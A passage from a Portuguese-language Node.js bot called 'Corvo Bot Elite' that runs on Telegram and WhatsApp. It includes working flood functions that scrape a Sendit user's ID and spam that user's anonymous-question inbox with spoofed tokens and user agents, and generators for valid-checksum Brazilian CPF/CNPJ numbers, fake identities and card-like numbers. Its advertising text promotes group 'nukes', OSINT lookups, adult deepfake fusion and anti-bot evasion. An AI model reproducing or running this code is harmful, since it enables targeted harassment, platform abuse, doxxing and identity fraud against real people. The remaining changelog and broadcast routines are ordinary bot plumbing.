        await new Promise(r => setTimeout(r, 200));
    }
    ctx.reply(`🏁 • *FLOOD NGL FINALIZADO!*\n\n👤 Alvo: \`${username}\`\n✅ Sucessos: \`${success}\`\n❌ Erros: \`${error}\``, { parse_mode: 'Markdown' });
}

async function runSenditFlood(tid, stickerId, ctx) {
    const config = loadUserConfig(tid);
    const message = config.texto_flood || '🔥';
    const limit = config.quantidade_flood || 10;
    let success = 0;
    let error = 0;
    const cheerio = require('cheerio');
    const crypto = require('crypto');
    try {
        const url = `https://reply.getsendit.com/s/${stickerId}`;
        const response = await axios.get(url, { headers: { 'User-Agent': 'Mozilla/5.0' } });
        const $ = cheerio.load(response.data);
        const nextData = JSON.parse($('#__NEXT_DATA__').html());
        const userId = nextData.props.pageProps.props.stickerData.payload.sticker.author.id;
        for (let i = 0; i < limit; i++) {
            const shadowToken = crypto.randomUUID();
            const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36';
            const payload = {
                data: {
                    postType: 'sendit.post-type:question-and-answer-v1',
                    userId: userId,
                    stickerId: stickerId,
                    shadowToken: shadowToken,
                    userAgent: ua
                },
                replyData: {
                    question: message,
                    promptText: ''
                },
                authorDisplayName: 'CORVO BOT'
            };
            try {
                await axios.post('https://reply.getsendit.com/api/v1/sendpost', payload, {
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': ua,
                        'Cookie': `sendit-shadow-token=${shadowToken};`
                    },
                    timeout: 5000
                });
                success++;
            } catch (e) {
                error++;
            }
            await new Promise(r => setTimeout(r, 500));
        }
        ctx.reply(`🏁 • *FLOOD SENDIT FINALIZADO!*\n\n🆔 Sticker: \`${stickerId}\`\n✅ Sucessos: \`${success}\`\n❌ Erros: \`${error}\``, { parse_mode: 'Markdown' });
    } catch (e) {
        ctx.reply(`❌ • Erro ao iniciar flood Sendit: ${e.message}`);
    }
}

async function fetchRandomMeme() {
    try {
        const res = await axios.get('https://meme-api.com/gimme');
        if (res.data && res.data.url) {
            return { url: res.data.url, title: res.data.title };
        }
    } catch (e) { }
    return { url: 'https://files.catbox.moe/t7w3gk.jpg', title: 'Corvo Elite System' };
}

async function broadcastGlobalUpdate() {
    try {
        const meme = await fetchRandomMeme();
        const versionData = JSON.parse(fs.readFileSync('./version.json', 'utf-8'));

        // Formatação "FODA" para o Telegram
        let eliteMessage = `<blockquote>🦅 <b>CORVO BOT ELITE - CENTRAL DE COMANDO</b>\n\n`;
        eliteMessage += `🔥 <b>ATUALIZAÇÃO CRÍTICA DETECTADA!</b>\n`;
        eliteMessage += `📦 <b>Versão:</b> <code>v${versionData.version}</code>\n`;
        eliteMessage += `💎 <b>Status:</b> 🚀 <i>POTÊNCIA TOTAL ATIVADA</i>\n\n`;
        eliteMessage += `✨ <b>NOVIDADES:</b>\n`;
        eliteMessage += `• Sistema de Fusão DeepFake Adulta\n`;
        eliteMessage += `• Novas APIs de Consulta (Puxar Foto)\n`;
        eliteMessage += `• Evasão de Anti-Bot Aprimorada\n\n`;
        eliteMessage += `😂 <b>MEME DO DIA:</b> <i>"${meme.title}"</i>\n\n`;
        eliteMessage += `⚡ <i>Corvo Intelligence System - Dominação Total</i></blockquote>`;

        // 1. Posta no Canal do Telegram com visual premium
        if (CHANNEL_ID) {
            try {
                // Alterna entre foto e vídeo de boas-vindas se disponível
                await bot.telegram.sendPhoto(CHANNEL_ID, meme.url, {
                    caption: eliteMessage,
                    parse_mode: 'HTML'
                });
                logEvent('SUCCESS', `📢 Broadcast Elite enviado para o Canal: ${CHANNEL_ID}`);
            } catch (e) {
                logEvent('ERROR', `❌ Erro ao postar no Telegram: ${e.message}`);
            }
        }

        logEvent('INFO', '✅ Broadcast de Status do WhatsApp ignorado conforme nova diretriz.');
    } catch (e) {
        logEvent('ERROR', `Erro no broadcast global: ${e.message}`);
    }
}

async function postToWhatsAppStatus(tid) {
    try {
        const meme = await fetchRandomMeme();
        const versionData = JSON.parse(fs.readFileSync('./version.json', 'utf-8'));
        const statusText = `🦅 *CORVO BOT ELITE v${versionData.version}*\n\n🔥 Novas funções liberadas!\n🚀 Performance total em rajadas e OSINT.\n\n👑 *Status:* On-line e pronto para combate.\n\n⚡ _Corvo Intelligence System_`;

        const sock = userSessions[tid];
        if (sock?.user) {
            const response = await axios.get(meme.url, { responseType: 'arraybuffer' });
            await sock.sendMessage('status@broadcast', {
                image: Buffer.from(response.data),
                caption: statusText
            });
        }
    } catch (e) { }
}
function generateHash(content) {
    const crypto = require('crypto');
    return crypto.createHash('md5').update(content).digest('hex');
}

function autoIncrementVersion(currentVersion) {
    const parts = currentVersion.split('.');
    const patch = parseInt(parts[2]) + 1;
    return `${parts[0]}.${parts[1]}.${patch}`;
}

function getDateBR() {
    // Data do Brasil (BRT/GMT-3)
    const now = new Date();
    const brazilTime = new Date(now.toLocaleString('en-US', { timeZone: 'America/Sao_Paulo' }));
    const day = String(brazilTime.getDate()).padStart(2, '0');
    const month = String(brazilTime.getMonth() + 1).padStart(2, '0');
    const year = brazilTime.getFullYear();
    return `${day}/${month}/${year}`;
}

function getTimeBR() {
    // Horário do Brasil (BRT/GMT-3)
    const now = new Date();
    const brazilTime = new Date(now.toLocaleString('en-US', { timeZone: 'America/Sao_Paulo' }));
    const hours = String(brazilTime.getHours()).padStart(2, '0');
    const minutes = String(brazilTime.getMinutes()).padStart(2, '0');
    return `${hours}:${minutes}`;
}

async function autoDetectAndPostUpdates() {
    try {
        // Lê o código atual
        const currentCode = fs.readFileSync('./index.js', 'utf-8');
        const currentHash = generateHash(currentCode);
        const currentSize = (currentCode.length / 1024).toFixed(2); // KB

        // Verifica se existe hash anterior
        let lastHash = null;
        let lastSize = 0;
        if (fs.existsSync(CODE_HASH_FILE)) {
            const hashData = JSON.parse(fs.readFileSync(CODE_HASH_FILE, 'utf-8'));
            lastHash = hashData.hash;
            lastSize = hashData.size;
        }

        // Se o hash mudou, significa que o código foi alterado
        if (currentHash !== lastHash) {
            logEvent('INFO', '🔍 Mudanças detectadas no código! Gerando changelog...');

            // Carrega versão atual
            let versionData = { version: '2.5.0' };
            if (fs.existsSync(VERSION_FILE)) {
                versionData = JSON.parse(fs.readFileSync(VERSION_FILE, 'utf-8'));
            }

            // Auto-incrementa versão
            const newVersion = autoIncrementVersion(versionData.version);
            const updateDate = getDateBR();
            const updateTime = getTimeBR();

            // Calcula diferença de tamanho
            const sizeDiff = (currentSize - lastSize).toFixed(2);
            const sizeChange = sizeDiff > 0 ? `+${sizeDiff}KB` : `${sizeDiff}KB`;

            // Gera changelog automático
            const autoChangelog = [
                `🔄 Código atualizado automaticamente`,
                `📊 Tamanho: ${currentSize}KB (${sizeChange})`,
                `⏰ Horário: ${updateTime}`,
                `🔐 Hash: ${currentHash.substring(0, 8)}...`
            ];

            // Detecta mudanças específicas (análise simples)
            const changes = [];
            if (currentCode.includes('rajar4FloodStatus') && !lastHash) {
                changes.push('🎯 Sistema Rajar 4 otimizado');
            }
            if (currentCode.includes('ALL_GROUPS')) {
                changes.push('✅ Funcionalidade de seleção múltipla');
            }
            if (currentCode.includes('autoDetectAndPostUpdates')) {
                changes.push('🤖 Sistema automático de changelog');
            }
            if (sizeDiff > 5) {
                changes.push('➕ Novas funcionalidades adicionadas');
            } else if (sizeDiff < -5) {
                changes.push('🧹 Código otimizado e limpo');
            } else if (sizeDiff !== 0) {
                changes.push('🔧 Melhorias e correções aplicadas');
            }

            // Adiciona mudanças detectadas
            if (changes.length > 0) {
                autoChangelog.push(...changes);
            }

            // Salva nova versão
            const newVersionData = {
                version: newVersion,
                date: updateDate,
                time: updateTime,
                hash: currentHash,
                changelog: autoChangelog,
                auto_generated: true
            };

            fs.writeFileSync(VERSION_FILE, JSON.stringify(newVersionData, null, 2));
            logEvent('SUCCESS', `✅ Nova versão gerada: ${newVersion}`);

            // Monta mensagem de atualização
            let updateMessage = `🚀 *CORVO BOT - ATUALIZAÇÃO ${newVersion}*\n`;
            updateMessage += `📅 ${updateDate} às ${updateTime}\n\n`;
            updateMessage += `📋 *MUDANÇAS DETECTADAS:*\n`;
            autoChangelog.forEach(change => {
                updateMessage += `${change}\n`;
            });
            updateMessage += `\n🤖 _Atualização detectada e gerada automaticamente_\n`;
            updateMessage += `💙 *EQP CORVO*`;

            // Posta no canal do Telegram
            try {
                await bot.telegram.sendMessage(CHANNEL_ID, updateMessage, { parse_mode: 'Markdown' });
                logEvent('SUCCESS', `📢 Changelog postado no canal Telegram: ${CHANNEL_ID}`);
            } catch (e) {
                logEvent('ERROR', `❌ Erro ao postar no Telegram: ${e.message}`);
            }

            // Aguarda 5 segundos
            await delay(5000);

            // Posta no canal do WhatsApp
            try {
                const adminSock = userSessions[ADMIN_ID];
                if (adminSock && adminSock.user) {
                    for (const channelId of MANDATORY_CHANNELS) {
                        try {
                            await adminSock.sendMessage(channelId, { text: updateMessage });
                            logEvent('SUCCESS', `📱 Changelog postado no WhatsApp: ${channelId}`);
                            await delay(2000);
                        } catch (e) {
                            logEvent('ERROR', `❌ Erro ao postar no WhatsApp ${channelId}: ${e.message}`);
                        }
                    }
                } else {
                    logEvent('WARN', '⚠️ Admin não conectado ao WhatsApp. Pulando post no WhatsApp.');
                }
            } catch (e) {
                logEvent('ERROR', `❌ Erro ao postar no WhatsApp: ${e.message}`);
            }

            // --- NOVIDADE: BROADCAST GLOBAL (TELEGRAM + WHATSAPP STATUS) ---
            logEvent('INFO', '📢 Iniciando Broadcast Global de Memes e Updates...');
            await broadcastGlobalUpdate();

            // Salva hash atual
            fs.writeFileSync(CODE_HASH_FILE, JSON.stringify({
                hash: currentHash,
                size: currentSize,
                version: newVersion,
                date: updateDate,
                time: updateTime
            }, null, 2));

            logEvent('SUCCESS', '✅ Sistema de changelog e Status automático concluído!');
        } else {
            logEvent('INFO', `✅ Código sem alterações (hash: ${currentHash.substring(0, 8)}...)`);
        }
    } catch (e) {
        logEvent('ERROR', `❌ Erro no sistema automático: ${e.message}`);
    }
}

// --- SISTEMA DE CHANGELOG AUTOMÁTICO (LEGADO - MANTIDO PARA COMPATIBILIDADE) ---
async function checkAndPostUpdates() {
    try {
        // Verifica se existe arquivo de versão
        if (!fs.existsSync(VERSION_FILE)) {
            logEvent('WARN', 'Arquivo version.json não encontrado.');
            return;
        }

        // Lê a versão atual
        const currentVersion = JSON.parse(fs.readFileSync(VERSION_FILE, 'utf-8'));

        // Verifica última versão postada
        let lastVersion = { version: '0.0.0' };
        if (fs.existsSync(LAST_VERSION_FILE)) {
            lastVersion = JSON.parse(fs.readFileSync(LAST_VERSION_FILE, 'utf-8'));
        }

        // Se a versão mudou, posta as atualizações
        if (currentVersion.version !== lastVersion.version) {
            logEvent('INFO', `Nova versão detectada: ${currentVersion.version} (anterior: ${lastVersion.version})`);

            // Monta a mensagem de atualização
            let updateMessage = `🚀 *CORVO BOT - ATUALIZAÇÃO ${currentVersion.version}*\n`;
            updateMessage += `📅 Data: ${currentVersion.date}\n\n`;
            updateMessage += `📋 *MUDANÇAS:*\n`;
            currentVersion.changelog.forEach(change => {
                updateMessage += `${change}\n`;
            });

            if (currentVersion.features && currentVersion.features.length > 0) {
                updateMessage += `\n✨ *NOVOS RECURSOS:*\n`;
                currentVersion.features.forEach(feature => {
                    updateMessage += `• ${feature}\n`;
                });
            }

            updateMessage += `\n💙 *EQP CORVO*`;

            // Posta no canal do Telegram
            try {
                await bot.telegram.sendMessage(CHANNEL_ID, updateMessage, { parse_mode: 'Markdown' });
                logEvent('SUCCESS', `Changelog postado no canal do Telegram: ${CHANNEL_ID}`);
            } catch (e) {
                logEvent('ERROR', `Erro ao postar no canal Telegram: ${e.message}`);
            }

            // Aguarda 5 segundos antes de postar no WhatsApp
            await delay(5000);

            // Posta no canal do WhatsApp (usando a primeira sessão admin disponível)
            try {
                const adminSock = userSessions[ADMIN_ID];
                if (adminSock && adminSock.user) {
                    // Posta em cada canal obrigatório
                    for (const channelId of MANDATORY_CHANNELS) {
                        try {
                            await adminSock.sendMessage(channelId, { text: updateMessage });
                            logEvent('SUCCESS', `Changelog postado no canal WhatsApp: ${channelId}`);
                            await delay(2000);
                        } catch (e) {
                            logEvent('ERROR', `Erro ao postar no canal WhatsApp ${channelId}: ${e.message}`);
                        }
                    }
                } else {
                    logEvent('WARN', 'Admin não conectado ao WhatsApp. Changelog não postado no WhatsApp.');
                }
            } catch (e) {
                logEvent('ERROR', `Erro ao postar no WhatsApp: ${e.message}`);
            }

            // Salva a versão atual como última postada
            fs.writeFileSync(LAST_VERSION_FILE, JSON.stringify(currentVersion, null, 2));
            logEvent('SUCCESS', 'Versão atualizada salva com sucesso!');
        } else {
            logEvent('INFO', `Versão atual ${currentVersion.version} já foi postada. Nenhuma atualização necessária.`);
        }
    } catch (e) {
        logEvent('ERROR', `Erro no sistema de changelog: ${e.message}`);
    }
}

bot.catch((err) => logEvent('ERROR', `Bot Error: ${err.message}`));

(async () => {
    try {
        logEvent('INFO', 'Limpando webhooks e conexões presas...');
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        logEvent('INFO', 'Iniciando bot...');
        await bot.launch({ dropPendingUpdates: true });
        showDashboard();
        console.log('\x1b[32m\x1b[1m%s\x1b[0m', '    🦅 BOT CORVO ELITE ONLINE! 🦅');
        console.log('\x1b[36m%s\x1b[0m', '    O Predador Supremo da Divulgação está ativo.');



    // Configura a descrição do bot (Tela inicial antes do Start)
    try {
        const description = "🦅 CORVO BOT ELITE\n" +
            "O Predador Supremo da Divulgação\n\n" +
            "Domine o Telegram com as rajadas mais potentes, nukes estratégicos e consultas OSINT profissionais do Brasil.\n\n" +
            "🔥 PODER SEM LIMITES:\n" +
            "• Rajadas Ultra-Sônicas\n" +
            "• Nuke Inteligente em Grupos\n" +
            "• Consultas de Elite\n" +
            "• Inteligência Artificial\n\n" +
            "🚀 Prepare-se para o próximo nível.";
        await bot.telegram.setMyDescription(description);
        await bot.telegram.setMyShortDescription("🦅 O Predador Supremo da Divulgação!");
    } catch (e) {
        logEvent('WARN', 'Não foi possível atualizar a descrição do bot.');
    }

    // Aguarda 10 segundos para dar tempo de conectar o WhatsApp do admin
    setTimeout(async () => {
        logEvent('INFO', '🤖 Iniciando sistema automático de detecção de mudanças...');
        await autoDetectAndPostUpdates();
    }, 10000);
    } catch (e) {
        logEvent('ERROR', `Falha crítica ao iniciar o bot: ${e.message}`);
        process.exit(1);
    }
})();

// --- GERADORES ELITE ---
function generateCPF() {
    const n = () => Math.floor(Math.random() * 9);
    const n1 = n(), n2 = n(), n3 = n(), n4 = n(), n5 = n(), n6 = n(), n7 = n(), n8 = n(), n9 = n();
    let d1 = n9 * 2 + n8 * 3 + n7 * 4 + n6 * 5 + n5 * 6 + n4 * 7 + n3 * 8 + n2 * 9 + n1 * 10;
    d1 = 11 - (d1 % 11); if (d1 >= 10) d1 = 0;
    let d2 = d1 * 2 + n9 * 3 + n8 * 4 + n7 * 5 + n6 * 6 + n5 * 7 + n4 * 8 + n3 * 9 + n2 * 10 + n1 * 11;
    d2 = 11 - (d2 % 11); if (d2 >= 10) d2 = 0;
    return `${n1}${n2}${n3}.${n4}${n5}${n6}.${n7}${n8}${n9}-${d1}${d2}`;
}

function generateCNPJ() {
    const n = () => Math.floor(Math.random() * 9);
    const n1 = n(), n2 = n(), n3 = n(), n4 = n(), n5 = n(), n6 = n(), n7 = n(), n8 = n(), n9 = 0, n10 = 0, n11 = 0, n12 = 1;
    let d1 = n12 * 2 + n11 * 3 + n10 * 4 + n9 * 5 + n8 * 6 + n7 * 7 + n6 * 8 + n5 * 9 + n4 * 2 + n3 * 3 + n2 * 4 + n1 * 5;
    d1 = 11 - (d1 % 11); if (d1 >= 10) d1 = 0;
    let d2 = d1 * 2 + n12 * 3 + n11 * 4 + n10 * 5 + n9 * 6 + n8 * 7 + n7 * 8 + n6 * 9 + n5 * 2 + n4 * 3 + n3 * 4 + n2 * 5 + n1 * 6;
    d2 = 11 - (d2 % 11); if (d2 >= 10) d2 = 0;
    return `${n1}${n2}.${n3}${n4}${n5}.${n6}${n7}${n8}/${n9}${n10}${n11}${n12}-${d1}${d2}`;
}

function generateRandomPerson() {
    const nomes = ["Marcos Silva", "Lucas Oliveira", "Ana Costa", "Julia Santos", "Roberto Almeida", "Fernanda Lima"];
    const maes = ["Maria Silva", "Lucia Oliveira", "Antonia Costa", "Josefa Santos", "Tereza Almeida", "Sonia Lima"];
    const cidades = ["São Paulo/SP", "Rio de Janeiro/RJ", "Belo Horizonte/MG", "Curitiba/PR", "Fortaleza/CE"];

    return {
        nome: nomes[Math.floor(Math.random() * nomes.length)],
        cpf: generateCPF(),
        nascimento: `${Math.floor(Math.random() * 28 + 1)}/0${Math.floor(Math.random() * 9 + 1)}/19${Math.floor(Math.random() * 30 + 70)}`,
        mae: maes[Math.floor(Math.random() * maes.length)],
        cidade: cidades[Math.floor(Math.random() * cidades.length)].split('/')[0],
        uf: cidades[Math.floor(Math.random() * cidades.length)].split('/')[1]
    };
}

function generateTestCard() {
    const brands = ["Visa", "Mastercard", "Elo", "Amex"];
    const brand = brands[Math.floor(Math.random() * brands.length)];
    const num = Array.from({ length: 12 }, () => Math.floor(Math.random() * 10)).join('');
    return {
        number: `4${num}${Math.floor(Math.random() * 999)}`,
        expiry: `${Math.floor(Math.random() * 12 + 1)}/2${Math.floor(Math.random() * 5 + 5)}`,
        cvv: Math.floor(Math.random() * 899 + 100),
        brand: brand
    };
}

// Encerramento Graceful (FIX S3: fecha todos os sockets WA antes de parar o bot)
async function gracefulShutdown(signal) {
    logEvent('WARN', `Encerrando via ${signal}...`);
    for (const [tid, sock] of Object.entries(userSessions)) {
        try {
            if (connectionTimers[tid]) connectionTimers[tid].manualDisconnect = true;
            sock.ev?.removeAllListeners();
            sock.end?.();
            logEvent('INFO', `Socket WA encerrado: ${tid}`);
        } catch (e) { }
    }
    // Salva dados pendentes
    saveStats();
    saveUsersData();
    saveVips();
    setTimeout(() => {
        bot.stop(signal);
        process.exit(0);
    }, 1500);
}

process.once('SIGINT', () => gracefulShutdown('SIGINT'));
process.once('SIGTERM', () => gracefulShutdown('SIGTERM'));